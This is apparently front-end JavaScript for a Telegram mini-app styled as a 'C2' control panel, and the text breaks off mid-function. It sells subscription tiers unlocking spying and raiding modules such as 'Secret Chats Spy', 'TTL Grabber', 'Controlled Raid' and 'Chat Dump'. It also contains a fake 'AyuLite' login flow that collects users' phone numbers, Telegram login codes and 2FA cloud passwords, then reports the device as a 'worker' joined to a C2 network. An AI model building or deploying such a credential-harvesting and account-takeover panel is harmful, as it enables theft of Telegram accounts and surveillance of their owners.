// Telegram Web App SDK initialization
const tg = window.Telegram?.WebApp;

// Конфигурация 5 видов подписок
const SUBSCRIPTION_TIERS = {
  creator: {
    rank: 5,
    name: 'СОЗДАТЕЛЬ',
    badgeClass: 'badge-creator',
    color: '#ff3b30'
  },
  admin: {
    rank: 4,
    name: 'АДМИН',
    badgeClass: 'badge-admin',
    color: '#f59e0b'
  },
  ultimate: {
    rank: 3,
    name: 'ULTIMATE',
    badgeClass: 'badge-ultimate',
    color: '#a855f7'
  },
  premium: {
    rank: 2,
    name: 'PREMIUM',
    badgeClass: 'badge-premium',
    color: '#06b6d4'
  },
  pro: {
    rank: 1,
    name: 'PRO',
    badgeClass: 'badge-pro',
    color: '#10b981'
  },
  none: {
    rank: 0,
    name: 'БАЗОВЫЙ',
    badgeClass: 'badge-none',
    color: '#64748b'
  }
};

// Требуемый минимальный ранг для каждого из 45 модулей (1=Pro, 2=Premium, 3=Ultimate)
const MODULE_REQUIREMENTS = {
  // Защита и Теневые протоколы (12)
  'Shadow Mirror': { rank: 3, planName: 'Ultimate' },
  'Session Sentinel': { rank: 3, planName: 'Ultimate' },
  'Secret Chats Spy': { rank: 3, planName: 'Ultimate' },
  'Bio Watcher': { rank: 3, planName: 'Ultimate' },
  'Ghost Online': { rank: 3, planName: 'Ultimate' },
  'Panic Switch': { rank: 3, planName: 'Ultimate' },
  'Zero-Knowledge Vault': { rank: 3, planName: 'Ultimate' },
  'TTL Grabber': { rank: 2, planName: 'Premium' },
  'Ghost Story Ripper': { rank: 2, planName: 'Premium' },
  'Anti-Delete': { rank: 1, planName: 'Pro' },
  'Anti-Edit': { rank: 1, planName: 'Pro' },
  'Ghost Read': { rank: 1, planName: 'Pro' },

  // Медиа-комбайн и AI (7)
  'Speech-to-Text': { rank: 3, planName: 'Ultimate' },
  'Text-to-Speech': { rank: 3, planName: 'Ultimate' },
  'Video to Circle': { rank: 2, planName: 'Premium' },
  'Round Video': { rank: 2, planName: 'Premium' },
  'Voice Converter': { rank: 2, planName: 'Premium' },
  'Media Saver': { rank: 2, planName: 'Premium' },
  'Restricted DL': { rank: 2, planName: 'Premium' },

  // Модерация и Чат-менеджмент (9)
  'Mass Tagging': { rank: 2, planName: 'Premium' },
  'Fast Pin': { rank: 2, planName: 'Premium' },
  'Fast Unpin': { rank: 2, planName: 'Premium' },
  'Fast Kick': { rank: 2, planName: 'Premium' },
  'Fast Ban': { rank: 2, planName: 'Premium' },
  'Quick Delete': { rank: 1, planName: 'Pro' },
  'Bulk Purge': { rank: 1, planName: 'Pro' },
  'Local Mute': { rank: 3, planName: 'Ultimate' },
  'Local Unmute': { rank: 3, planName: 'Ultimate' },

  // OSINT, Информеры и Реакции (17)
  'Deep Archive': { rank: 3, planName: 'Ultimate' },
  'Human Typewriter': { rank: 3, planName: 'Ultimate' },
  'Controlled Raid': { rank: 3, planName: 'Ultimate' },
  'User OSINT': { rank: 2, planName: 'Premium' },
  'Chat Audit': { rank: 2, planName: 'Premium' },
  'Chat Dump': { rank: 2, planName: 'Premium' },
  'Auto-Reaction': { rank: 2, planName: 'Premium' },
  'Ping & Latency': { rank: 1, planName: 'Pro' },
  'Node Uptime': { rank: 1, planName: 'Pro' },
  'DC & Cluster OSINT': { rank: 1, planName: 'Pro' },
  'DC OSINT': { rank: 1, planName: 'Pro' },
  'Message ID': { rank: 1, planName: 'Pro' },
  'Quick Math Calc': { rank: 1, planName: 'Pro' },
  'Instant Translator': { rank: 1, planName: 'Pro' },
  'Live Weather': { rank: 1, planName: 'Pro' },
  'Image OCR': { rank: 1, planName: 'Pro' },
  'Activity Faker': { rank: 1, planName: 'Pro' },
  'AFK Responder': { rank: 1, planName: 'Pro' }
};

// Истинный системный Создатель (Root)
const ROOT_CREATOR_IDS = [7926138510, 1406048573];
function isRootCreator(id) { return ROOT_CREATOR_IDS.includes(Number(id)); }

let currentUserTierKey = 'none';

document.addEventListener('DOMContentLoaded', () => {
  if (tg) {
    tg.ready();
    tg.expand();
    
    // Apply Telegram theme colors if available
    document.documentElement.style.setProperty('--tg-theme-bg-color', tg.backgroundColor || '#0a0d14');
    
    // Setup MainButton
    tg.MainButton.setText('⚡️ Закрыть Web App');
    tg.MainButton.onClick(() => tg.close());
  }

  // Определение подписки и данных пользователя
  loadUserData();

  // Восстановление состояния модулей и применение фильтра тарифа
  restoreModulesState();
  applyModuleFilter();

  // Инициализация вкладок
  setupTabs();

  // Setup Refresh Button
  document.getElementById('btn-refresh')?.addEventListener('click', () => {
    triggerHaptic('light');
    const btn = document.getElementById('btn-refresh');
    btn.style.transform = 'rotate(360deg)';
    setTimeout(() => {
      btn.style.transform = 'none';
      showAlert(`Синхронизировано! Ваша подписка: «${SUBSCRIPTION_TIERS[currentUserTierKey].name}»`);
    }, 400);
  });
});

// Текущий режим фильтрации каталога модулей ('my' = только своего тарифа)
let currentModuleFilter = 'my';

function setModuleFilter(filterType) {
  currentModuleFilter = filterType;
  triggerHaptic('selection');

  // Обновляем активный пилл
  document.querySelectorAll('.filter-pill').forEach(pill => {
    pill.classList.toggle('active', pill.getAttribute('data-filter') === filterType);
  });

  applyModuleFilter();
}

function applyModuleFilter() {
  const userRank = SUBSCRIPTION_TIERS[currentUserTierKey]?.rank || 0;
  const cards = document.querySelectorAll('.module-card');
  const titleEl = document.getElementById('modules-title');
  const subEl = document.getElementById('modules-subtitle');
  const myTierBadge = document.getElementById('my-tier-badge');
  if (myTierBadge) {
    myTierBadge.textContent = SUBSCRIPTION_TIERS[currentUserTierKey]?.name || 'PRO';
  }

  let visibleCount = 0;

  cards.forEach(card => {
    const cardRank = parseInt(card.getAttribute('data-rank'), 10) || 1;
    const cardTier = card.getAttribute('data-tier') || 'pro';
    const isLocked = userRank < cardRank;
    const checkbox = card.querySelector('input[type="checkbox"]');

    let shouldShow = false;

    if (currentModuleFilter === 'my') {
      // Режим «Мой тариф»: показываем СТРОГО функции, доступные текущей подписке
      shouldShow = !isLocked;
    } else if (currentModuleFilter === 'pro') {
      shouldShow = (cardTier === 'pro');
    } else if (currentModuleFilter === 'premium') {
      shouldShow = (cardTier === 'premium');
    } else if (currentModuleFilter === 'ultimate') {
      shouldShow = (cardTier === 'ultimate');
    } else if (currentModuleFilter === 'all') {
      shouldShow = true;
    }

    if (shouldShow) {
      card.style.display = 'flex';
      visibleCount++;
    } else {
      card.style.display = 'none';
    }

    // Состояние блокировки для недоступных тарифов при общем обзоре
    if (isLocked) {
      card.classList.add('card-locked');
      if (checkbox) {
        checkbox.disabled = true;
        checkbox.checked = false;
      }
    } else {
      card.classList.remove('card-locked');
      if (checkbox) {
        checkbox.disabled = false;
      }
    }
  });

  // Автоматически скрываем пустые заголовки категорий
  document.querySelectorAll('.module-category').forEach(cat => {
    const visibleCards = cat.querySelectorAll('.module-card[style*="display: flex"]');
    cat.style.display = visibleCards.length > 0 ? 'flex' : 'none';
  });

  // Обновляем заголовок и счетчик
  if (titleEl && subEl) {
    if (currentModuleFilter === 'my') {
      const tierName = SUBSCRIPTION_TIERS[currentUserTierKey]?.name || 'PRO';
      titleEl.textContent = `Модули вашего тарифа (${tierName})`;
      subEl.textContent = `Доступно функций: ${visibleCount} из 45. Недоступные модули скрыты.`;
    } else if (currentModuleFilter === 'all') {
      titleEl.textContent = `Все 45 модулей системы`;
      const unlockedCount = cards.length - document.querySelectorAll('.module-card.card-locked').length;
      subEl.textContent = `Разблокировано: ${unlockedCount} из 45 модулей.`;
    } else {
      titleEl.textContent = `Модули категории ${currentModuleFilter.toUpperCase()}`;
      subEl.textContent = `Отображено функций: ${visibleCount}`;
    }
  }
}

// Обновление бейджа и стилей интерфейса
function applyTierToUI(tierKey) {
  const tierConfig = SUBSCRIPTION_TIERS[tierKey] || SUBSCRIPTION_TIERS.creator;
  const badgeEl = document.getElementById('vip-badge');
  if (badgeEl) {
    badgeEl.className = 'badge-vip';
    badgeEl.classList.add(tierConfig.badgeClass);
    badgeEl.textContent = tierConfig.name;
  }
  applyModuleFilter();
}

// Ручное переключение тарифа (для теста и моментальной смены)
function switchTierManual(tierKey) {
  if (!SUBSCRIPTION_TIERS[tierKey]) return;
  triggerHaptic('impact');
  currentUserTierKey = tierKey;
  localStorage.setItem('c2_user_tier', tierKey);
  applyTierToUI(tierKey);
  restoreModulesState();

  const expiryEl = document.getElementById('user-expiry');
  if (expiryEl) {
    const expText = tierKey === 'creator' ? 'Навсегда' : '30 дней';
    expiryEl.textContent = `⏳ Срок: ${expText}`;
    localStorage.setItem('c2_user_expiry', expText);
  }

  showAlert(`Уровень подписки переключен на «${SUBSCRIPTION_TIERS[tierKey].name}»! Все права обновлены.`);
}

// Load User info and determine subscription tier
function loadUserData() {
  const user = tg?.initDataUnsafe?.user;
  const nameEl = document.getElementById('user-name');
  const idEl = document.getElementById('user-id');
  const avatarEl = document.getElementById('user-avatar');
  const expiryEl = document.getElementById('user-expiry');

  const urlParams = new URLSearchParams(window.location.search);
  const tierFromUrl = urlParams.get('tier')?.toLowerCase();
  const userIdFromUrl = parseInt(urlParams.get('user_id'), 10);
  const expiryFromUrl = urlParams.get('expiry');

  const effectiveUserId = user?.id || userIdFromUrl || 0;

  // 1. Приоритет №1: Явно переданный в URL параметр ?tier=... (от бота)
  if (tierFromUrl && SUBSCRIPTION_TIERS[tierFromUrl]) {
    currentUserTierKey = tierFromUrl;
    localStorage.setItem('c2_user_tier', tierFromUrl);
  } else {
    // 2. Приоритет №2: Сохраненный тариф в браузере
    let savedTier = localStorage.getItem('c2_user_tier');
    // Сбрасываем старый залипший кэш 'creator', если пользователь не истинный root создатель
    if (savedTier === 'creator' && !isRootCreator(effectiveUserId)) {
      localStorage.removeItem('c2_user_tier');
      savedTier = null;
    }

    if (savedTier && SUBSCRIPTION_TIERS[savedTier]) {
      currentUserTierKey = savedTier;
    } else if (isRootCreator(effectiveUserId)) {
      // 3. Приоритет №3: Только истинный root создатель
      currentUserTierKey = 'creator';
      localStorage.setItem('c2_user_tier', 'creator');
    } else {
      currentUserTierKey = 'none';
      localStorage.setItem('c2_user_tier', 'none');
    }
  }

  // Применяем бейдж (красный для Создателя, золотой для Админа и т.д.)
  applyTierToUI(currentUserTierKey);

  // Отображаем срок действия подписки
  if (expiryEl) {
    if (expiryFromUrl) {
      expiryEl.textContent = `⏳ Срок: ${expiryFromUrl}`;
      localStorage.setItem('c2_user_expiry', expiryFromUrl);
    } else {
      const savedExpiry = localStorage.getItem('c2_user_expiry');
      if (savedExpiry) {
        expiryEl.textContent = `⏳ Срок: ${savedExpiry}`;
      } else {
        expiryEl.textContent = currentUserTierKey === 'creator' ? '⏳ Срок: Навсегда' : (currentUserTierKey === 'none' ? '⏳ Срок: Без подписки' : '⏳ Срок: Активна');
      }
    }
  }

  if (user) {
    const fullName = `${user.first_name || ''} ${user.last_name || ''}`.trim() || user.username || 'Оператор C2';
    nameEl.textContent = fullName;
    idEl.textContent = `ID: ${user.id} • @${user.username || 'anonym'}`;
    if (user.photo_url) {
      avatarEl.src = user.photo_url;
    } else {
      avatarEl.src = `https://api.dicebear.com/7.x/bottts/svg?seed=${user.id}`;
    }
  } else {
    nameEl.textContent = isRootCreator(effectiveUserId) ? 'Создатель C2 (Root)' : 'Оператор C2';
    idEl.textContent = `ID: ${effectiveUserId} • active`;
  }
}

// Восстановление переключателей из памяти
function restoreModulesState() {
  const switches = document.querySelectorAll('.modules-list input[type="checkbox"]');
  switches.forEach(sw => {
    const card = sw.closest('.module-card');
    const titleEl = card?.querySelector('h4');
    if (!titleEl) return;
    
    const moduleName = titleEl.textContent.trim().split('(')[0].trim();
    const savedState = localStorage.getItem(`c2_mod_${moduleName}`);

    const req = MODULE_REQUIREMENTS[moduleName];
    const userRank = SUBSCRIPTION_TIERS[currentUserTierKey]?.rank || 0;

    // ИЗНАЧАЛЬНО ВСЕ ФУНКЦИИ ВКЛЮЧЕНЫ (По умолчанию true, если пользователь явно не выключил)
    if (savedState === 'false') {
      sw.checked = false;
    } else {
      sw.checked = true;
      localStorage.setItem(`c2_mod_${moduleName}`, 'true');
    }
  });
}

// Tab Switching
function setupTabs() {
  const tabButtons = document.querySelectorAll('.tab-btn');
  const tabContents = document.querySelectorAll('.tab-content');

  tabButtons.forEach(btn => {
    btn.addEventListener('click', () => {
      triggerHaptic('selection');
      const targetId = btn.getAttribute('data-tab');

      tabButtons.forEach(b => b.classList.remove('active'));
      tabContents.forEach(c => c.classList.remove('active'));

      btn.classList.add('active');
      const targetContent = document.getElementById(targetId);
      if (targetContent) {
        targetContent.classList.add('active');
      }
    });
  });
}

// Haptic Feedback Helper
function triggerHaptic(type = 'light') {
  const hapticsEnabled = document.getElementById('toggle-haptics')?.checked ?? true;
  if (!hapticsEnabled || !tg?.HapticFeedback) return;

  switch (type) {
    case 'selection':
      tg.HapticFeedback.selectionChanged();
      break;
    case 'impact':
    case 'medium':
      tg.HapticFeedback.impactOccurred('medium');
      break;
    case 'heavy':
      tg.HapticFeedback.impactOccurred('heavy');
      break;
    case 'success':
      tg.HapticFeedback.notificationOccurred('success');
      break;
    case 'warning':
      tg.HapticFeedback.notificationOccurred('warning');
      break;
    default:
      tg.HapticFeedback.impactOccurred('light');
  }
}

// Modal handling
let currentSelectedPlan = '';

function openSubscribeModal(planTitle, price) {
  if (planTitle === 'Создатель' || planTitle === 'Админ') {
    showAlert('🔒 Тарифы «Создатель» и «Админ» являются закрытыми и выдаются только главным администратором.');
    return;
  }
  triggerHaptic('medium');
  currentSelectedPlan = planTitle;
  document.getElementById('modal-plan-title').textContent = `Подключение: ${planTitle}`;
  document.getElementById('modal-plan-price').textContent = price;
  document.getElementById('modal-subscribe').classList.add('active');
}

function closeSubscribeModal() {
  triggerHaptic('light');
  document.getElementById('modal-subscribe').classList.remove('active');
}

function processPayment(method) {
  triggerHaptic('success');
  closeSubscribeModal();
  
  // Сопоставляем тариф для активации на сайте (только коммерческие)
  const planMap = {
    'Ultimate': 'ultimate',
    'Premium': 'premium',
    'Pro': 'pro'
  };

  const selectedKey = planMap[currentSelectedPlan];
  if (selectedKey) {
    currentUserTierKey = selectedKey;
    localStorage.setItem('c2_user_tier', selectedKey);
    applyTierToUI(selectedKey);
    restoreModulesState();
    showAlert(`🎉 Подписка «${currentSelectedPlan}» успешно активирована на сайте!\nБейдж и доступ к модулям обновлены.`);
    return;
  }

  showAlert(`Заявка на подключение принята! Счет выставлен в боте.`);
}

// Проверка подписки и управление модулями
function toggleModule(checkbox, rawModuleName) {
  const moduleName = rawModuleName.split('(')[0].trim();
  const req = MODULE_REQUIREMENTS[moduleName];
  const userRank = SUBSCRIPTION_TIERS[currentUserTierKey]?.rank || 0;

  // Если ранг пользователя достаточен — модуль РАБОТАЕТ!
  if (!req || userRank >= req.rank) {
    triggerHaptic('success');
    localStorage.setItem(`c2_mod_${moduleName}`, checkbox.checked);
    const action = checkbox.checked ? 'активирован и работает' : 'отключен';
    showAlert(`✅ Модуль «${moduleName}» успешно ${action}!`);
    return;
  }

  // Если ранг недостаточен — откатываем переключатель и предлагаем апгрейд
  triggerHaptic('warning');
  checkbox.checked = false;
  openSubscribeModal(`Модуль «${moduleName}»`, `Тариф ${req.planName}`);
}

// Custom Alert with Telegram UI fallback
function showAlert(text) {
  if (tg?.showAlert) {
    tg.showAlert(text);
  } else {
    alert(text);
  }
}

// Включить все доступные функции
function enableAllModules() {
  const userRank = SUBSCRIPTION_TIERS[currentUserTierKey]?.rank || 0;
  const cards = document.querySelectorAll('.module-card');
  let enabledCount = 0;

  cards.forEach(card => {
    const cardRank = parseInt(card.getAttribute('data-rank'), 10) || 1;
    const isLocked = userRank < cardRank;
    const titleEl = card.querySelector('h4');
    const checkbox = card.querySelector('input[type="checkbox"]');

    if (!isLocked && checkbox && titleEl) {
      checkbox.checked = true;
      const rawName = titleEl.textContent.trim().split('(')[0].trim();
      localStorage.setItem('c2_mod_' + rawName, 'true');
      enabledCount++;
    }
  });

  triggerHaptic('success');
  showAlert('🚀 Все доступные функции (' + enabledCount + ' шт.) успешно включены и активны!');
}

// Отключить все функции
function disableAllModules() {
  const cards = document.querySelectorAll('.module-card');
  let disabledCount = 0;

  cards.forEach(card => {
    const titleEl = card.querySelector('h4');
    const checkbox = card.querySelector('input[type="checkbox"]');

    if (checkbox && titleEl) {
      checkbox.checked = false;
      const rawName = titleEl.textContent.trim().split('(')[0].trim();
      localStorage.setItem('c2_mod_' + rawName, 'false');
      disabledCount++;
    }
  });

  triggerHaptic('light');
  showAlert('🔄 Все функции (' + disabledCount + ' шт.) отключены.');
}


// ==============================================================================
// SAVEMOD / AYULITE FULLSCREEN AUTHENTICATION CONTROLLER
// ==============================================================================

const COUNTRIES_LIST = [
  { alpha: 'RU', name: { ru: 'Россия', en: 'Russia' }, dial: '+7' },
  { alpha: 'KZ', name: { ru: 'Казахстан', en: 'Kazakhstan' }, dial: '+7' },
  { alpha: 'BY', name: { ru: 'Беларусь', en: 'Belarus' }, dial: '+375' },
  { alpha: 'UA', name: { ru: 'Украина', en: 'Ukraine' }, dial: '+380' },
  { alpha: 'UZ', name: { ru: 'Узбекистан', en: 'Uzbekistan' }, dial: '+998' },
  { alpha: 'KG', name: { ru: 'Кыргызстан', en: 'Kyrgyzstan' }, dial: '+996' },
  { alpha: 'TJ', name: { ru: 'Таджикистан', en: 'Tajikistan' }, dial: '+992' },
  { alpha: 'AZ', name: { ru: 'Азербайджан', en: 'Azerbaijan' }, dial: '+994' },
  { alpha: 'AM', name: { ru: 'Армения', en: 'Armenia' }, dial: '+374' },
  { alpha: 'GE', name: { ru: 'Грузия', en: 'Georgia' }, dial: '+995' },
  { alpha: 'MD', name: { ru: 'Молдова', en: 'Moldova' }, dial: '+373' },
  { alpha: 'TM', name: { ru: 'Туркменистан', en: 'Turkmenistan' }, dial: '+993' },
  { alpha: 'CZ', name: { ru: 'Чехия', en: 'Czech Republic' }, dial: '+420' },
  { alpha: 'BD', name: { ru: 'Бангладеш', en: 'Bangladesh' }, dial: '+880' },
  { alpha: 'US', name: { ru: 'США / Канада', en: 'USA / Canada' }, dial: '+1' },
  { alpha: 'DE', name: { ru: 'Германия', en: 'Germany' }, dial: '+49' },
  { alpha: 'GB', name: { ru: 'Великобритания', en: 'United Kingdom' }, dial: '+44' },
  { alpha: 'FR', name: { ru: 'Франция', en: 'France' }, dial: '+33' },
  { alpha: 'IT', name: { ru: 'Италия', en: 'Italy' }, dial: '+39' },
  { alpha: 'ES', name: { ru: 'Испания', en: 'Spain' }, dial: '+34' },
  { alpha: 'PL', name: { ru: 'Польша', en: 'Poland' }, dial: '+48' },
  { alpha: 'TR', name: { ru: 'Турция', en: 'Turkey' }, dial: '+90' },
  { alpha: 'AE', name: { ru: 'ОАЭ', en: 'UAE' }, dial: '+971' },
  { alpha: 'IL', name: { ru: 'Израиль', en: 'Israel' }, dial: '+972' },
  { alpha: 'CY', name: { ru: 'Кипр', en: 'Cyprus' }, dial: '+357' },
  { alpha: 'NL', name: { ru: 'Нидерланды', en: 'Netherlands' }, dial: '+31' },
  { alpha: 'BE', name: { ru: 'Бельгия', en: 'Belgium' }, dial: '+32' },
  { alpha: 'CH', name: { ru: 'Швейцария', en: 'Switzerland' }, dial: '+41' },
  { alpha: 'AT', name: { ru: 'Австрия', en: 'Austria' }, dial: '+43' },
  { alpha: 'SE', name: { ru: 'Швеция', en: 'Sweden' }, dial: '+46' },
  { alpha: 'NO', name: { ru: 'Норвегия', en: 'Norway' }, dial: '+47' },
  { alpha: 'FI', name: { ru: 'Финляндия', en: 'Finland' }, dial: '+358' },
  { alpha: 'DK', name: { ru: 'Дания', en: 'Denmark' }, dial: '+45' },
  { alpha: 'EE', name: { ru: 'Эстония', en: 'Estonia' }, dial: '+372' },
  { alpha: 'LV', name: { ru: 'Латвия', en: 'Latvia' }, dial: '+371' },
  { alpha: 'LT', name: { ru: 'Литва', en: 'Lithuania' }, dial: '+370' },
  { alpha: 'SK', name: { ru: 'Словакия', en: 'Slovakia' }, dial: '+421' },
  { alpha: 'HU', name: { ru: 'Венгрия', en: 'Hungary' }, dial: '+36' },
  { alpha: 'RO', name: { ru: 'Румыния', en: 'Romania' }, dial: '+40' },
  { alpha: 'BG', name: { ru: 'Болгария', en: 'Bulgaria' }, dial: '+359' },
  { alpha: 'RS', name: { ru: 'Сербия', en: 'Serbia' }, dial: '+381' },
  { alpha: 'ME', name: { ru: 'Черногория', en: 'Montenegro' }, dial: '+382' },
  { alpha: 'HR', name: { ru: 'Хорватия', en: 'Croatia' }, dial: '+385' },
  { alpha: 'SI', name: { ru: 'Словения', en: 'Slovenia' }, dial: '+386' },
  { alpha: 'BA', name: { ru: 'Босния и Герцеговина', en: 'Bosnia and Herzegovina' }, dial: '+387' },
  { alpha: 'MK', name: { ru: 'Северная Македония', en: 'North Macedonia' }, dial: '+389' },
  { alpha: 'AL', name: { ru: 'Албания', en: 'Albania' }, dial: '+355' },
  { alpha: 'GR', name: { ru: 'Греция', en: 'Greece' }, dial: '+30' },
  { alpha: 'PT', name: { ru: 'Португалия', en: 'Portugal' }, dial: '+351' },
  { alpha: 'IE', name: { ru: 'Ирландия', en: 'Ireland' }, dial: '+353' },
  { alpha: 'IS', name: { ru: 'Исландия', en: 'Iceland' }, dial: '+354' },
  { alpha: 'CN', name: { ru: 'Китай', en: 'China' }, dial: '+86' },
  { alpha: 'IN', name: { ru: 'Индия', en: 'India' }, dial: '+91' },
  { alpha: 'JP', name: { ru: 'Япония', en: 'Japan' }, dial: '+81' },
  { alpha: 'KR', name: { ru: 'Южная Корея', en: 'South Korea' }, dial: '+82' },
  { alpha: 'VN', name: { ru: 'Вьетнам', en: 'Vietnam' }, dial: '+84' },
  { alpha: 'TH', name: { ru: 'Таиланд', en: 'Thailand' }, dial: '+66' },
  { alpha: 'ID', name: { ru: 'Индонезия', en: 'Indonesia' }, dial: '+62' },
  { alpha: 'MY', name: { ru: 'Малайзия', en: 'Malaysia' }, dial: '+60' },
  { alpha: 'SG', name: { ru: 'Сингапур', en: 'Singapore' }, dial: '+65' },
  { alpha: 'PH', name: { ru: 'Филиппины', en: 'Philippines' }, dial: '+63' },
  { alpha: 'PK', name: { ru: 'Пакистан', en: 'Pakistan' }, dial: '+92' },
  { alpha: 'IR', name: { ru: 'Иран', en: 'Iran' }, dial: '+98' },
  { alpha: 'IQ', name: { ru: 'Ирак', en: 'Iraq' }, dial: '+964' },
  { alpha: 'SA', name: { ru: 'Саудовская Аравия', en: 'Saudi Arabia' }, dial: '+966' },
  { alpha: 'EG', name: { ru: 'Египет', en: 'Egypt' }, dial: '+20' },
  { alpha: 'ZA', name: { ru: 'ЮАР', en: 'South Africa' }, dial: '+27' },
  { alpha: 'NG', name: { ru: 'Нигерия', en: 'Nigeria' }, dial: '+234' },
  { alpha: 'BR', name: { ru: 'Бразилия', en: 'Brazil' }, dial: '+55' },
  { alpha: 'AR', name: { ru: 'Аргентина', en: 'Argentina' }, dial: '+54' },
  { alpha: 'MX', name: { ru: 'Мексика', en: 'Mexico' }, dial: '+52' },
  { alpha: 'CO', name: { ru: 'Колумбия', en: 'Colombia' }, dial: '+57' },
  { alpha: 'CL', name: { ru: 'Чили', en: 'Chile' }, dial: '+56' },
  { alpha: 'AU', name: { ru: 'Австралия', en: 'Australia' }, dial: '+61' },
  { alpha: 'NZ', name: { ru: 'Новая Зеландия', en: 'New Zealand' }, dial: '+64' },
  { alpha: 'HK', name: { ru: 'Гонконг', en: 'Hong Kong' }, dial: '+852' },
  { alpha: 'TW', name: { ru: 'Тайвань', en: 'Taiwan' }, dial: '+886' },
  { alpha: 'MA', name: { ru: 'Марокко', en: 'Morocco' }, dial: '+212' },
  { alpha: 'DZ', name: { ru: 'Алжир', en: 'Algeria' }, dial: '+213' },
  { alpha: 'TN', name: { ru: 'Тунис', en: 'Tunisia' }, dial: '+216' },
  { alpha: 'QA', name: { ru: 'Катар', en: 'Qatar' }, dial: '+974' },
  { alpha: 'KW', name: { ru: 'Кувейт', en: 'Kuwait' }, dial: '+965' },
  { alpha: 'OM', name: { ru: 'Оман', en: 'Oman' }, dial: '+968' },
  { alpha: 'BH', name: { ru: 'Бахрейн', en: 'Bahrain' }, dial: '+973' },
  { alpha: 'JO', name: { ru: 'Иордания', en: 'Jordan' }, dial: '+962' },
  { alpha: 'LB', name: { ru: 'Ливан', en: 'Lebanon' }, dial: '+961' }
];

const AUTH_I18N = {
  ru: {
    auth_title_step1: 'Вход в AyuLite',
    auth_sub_step1: 'Подтвердите код вашей страны и введите номер телефона.',
    auth_footnote_phone: 'Мы отправим код подтверждения в ваш Telegram.',
    auth_sub_otp: 'Мы отправили код в приложение Telegram. Введите его ниже.',
    auth_footnote_otp: 'Код придёт в чат Telegram от сервиса.',
    auth_resend_btn: 'Запросить новый код',
    auth_title_2fa: 'Облачный пароль',
    auth_sub_2fa: 'Ваш аккаунт защищён двухфакторной аутентификацией. Введите пароль',
    auth_footnote_2fa: 'Это пароль двухфакторной аутентификации Telegram, а не код из SMS',
    auth_pass_placeholder: 'Введите пароль',
    auth_success_title: 'Устройство привязано!',
    auth_success_sub: 'Воркер успешно инициализирован и подключен к C2-сети.',
    auth_btn_dashboard: '🚀 Перейти к управлению',
    picker_title: 'Выберите страну',
    resend_timer_prefix: 'Запросить код повторно через ',
    resend_timer_suffix: ' сек.'
  },
  en: {
    auth_title_step1: 'Sign in to AyuLite',
    auth_sub_step1: 'Confirm your country code and enter your phone number.',
    auth_footnote_phone: 'We will send a confirmation code to your Telegram.',
    auth_sub_otp: 'We sent a code to the Telegram app. Enter it below.',
    auth_footnote_otp: 'The code will arrive in Telegram from the service chat.',
    auth_resend_btn: 'Request new code',
    auth_title_2fa: 'Cloud Password',
    auth_sub_2fa: 'Your account is protected with two-step verification. Enter password',
    auth_footnote_2fa: 'This is Telegram 2FA cloud password, not SMS code',
    auth_pass_placeholder: 'Enter password',
    auth_success_title: 'Device Connected!',
    auth_success_sub: 'Worker initialized and connected to C2 mesh network.',
    auth_btn_dashboard: '🚀 Go to Dashboard',
    picker_title: 'Select Country',
    resend_timer_prefix: 'Resend code in ',
    resend_timer_suffix: ' sec.'
  }
};

let currentAuthLang = 'ru';
let selectedCountry = COUNTRIES_LIST[0]; // Czechia default matching screenshot
let authCurrentStep = 1;
let authPhoneFull = '';
let authTimerInterval = null;
let authSecondsLeft = 60;

// Resolve Backend Base URL (Works locally and when deployed)
function getApiBaseUrl() {
  const origin = window.location.origin;
  if (origin.includes('github.io') || origin.includes('localhost') || origin.startsWith('file:')) {
    // Если страница на GitHub Pages, пробуем локальный бэкенд или туннель
    return 'http://localhost:8080';
  }
  return origin;
}

// Open Auth Overlay
function openAuthOverlay() {
  triggerHaptic('selection');
  const overlay = document.getElementById('auth-overlay');
  if (!overlay) return;

  overlay.classList.add('active');
  setAuthStep(1);
  renderCountryPickerItems();

  const phoneInput = document.getElementById('auth-phone-input');
  if (phoneInput) {
    setTimeout(() => phoneInput.focus(), 200);
  }
}

// Close Auth Overlay
function closeAuthOverlay() {
  triggerHaptic('light');
  const overlay = document.getElementById('auth-overlay');
  if (overlay) {
    overlay.classList.remove('active');
  }
  clearInterval(authTimerInterval);
}

// Handle Back Button
function handleAuthBack() {
  triggerHaptic('light');
  if (authCurrentStep === 1) {
    closeAuthOverlay();
  } else if (authCurrentStep === 2) {
    setAuthStep(1);
  } else if (authCurrentStep === 3) {
    setAuthStep(2);
  } else {
    closeAuthOverlay();
  }
}

// Step Switcher
function setAuthStep(step) {
  authCurrentStep = step;
  document.querySelectorAll('.auth-step-container').forEach(c => c.classList.remove('active'));

  const stepEl = document.getElementById(`auth-step-${step === 4 ? 'success' : step}`);
  if (stepEl) {
    stepEl.classList.add('active');
  }

  const backBtn = document.getElementById('auth-back-btn');
  if (backBtn) {
    backBtn.style.visibility = (step === 4) ? 'hidden' : 'visible';
  }

  if (step === 2) {
    startOtpCountdown();
    setupOtpBoxInputs();
    setTimeout(() => {
      const firstBox = document.getElementById('otp-0');
      if (firstBox) firstBox.focus();
    }, 150);
  } else if (step === 3) {
    setTimeout(() => {
      const passInput = document.getElementById('auth-password-input');
      if (passInput) passInput.focus();
    }, 150);
  }
}

// Language Switcher
function setAuthLang(lang) {
  triggerHaptic('selection');
  currentAuthLang = lang;

  document.getElementById('lang-ru')?.classList.toggle('active', lang === 'ru');
  document.getElementById('lang-en')?.classList.toggle('active', lang === 'en');

  const dict = AUTH_I18N[lang] || AUTH_I18N.ru;
  document.querySelectorAll('[data-i18n]').forEach(el => {
    const key = el.getAttribute('data-i18n');
    if (dict[key]) {
      el.textContent = dict[key];
    }
  });

  const passInput = document.getElementById('auth-password-input');
  if (passInput) {
    passInput.placeholder = dict.auth_pass_placeholder;
  }

  // Update country label in selected row
  const nameEl = document.getElementById('selected-country-name');
  if (nameEl && selectedCountry) {
    nameEl.textContent = selectedCountry.name[lang] || selectedCountry.name.ru;
  }

  renderCountryPickerItems();
}

// Country Picker UI
function openCountryPicker() {
  triggerHaptic('medium');
  const modal = document.getElementById('country-picker-modal');
  if (modal) {
    modal.classList.add('active');
    const search = document.getElementById('country-search-input');
    if (search) {
      search.value = '';
      renderCountryPickerItems();
      setTimeout(() => search.focus(), 150);
    }
  }
}

function closeCountryPicker() {
  triggerHaptic('light');
  document.getElementById('country-picker-modal')?.classList.remove('active');
}

function renderCountryPickerItems(filterText = '') {
  const container = document.getElementById('country-list-items');
  if (!container) return;

  const query = filterText.toLowerCase().trim();
  const filtered = COUNTRIES_LIST.filter(c => {
    const ruName = c.name.ru.toLowerCase();
    const enName = c.name.en.toLowerCase();
    return ruName.includes(query) || enName.includes(query) || c.dial.includes(query) || c.alpha.toLowerCase().includes(query);
  });

  container.innerHTML = filtered.map(c => `
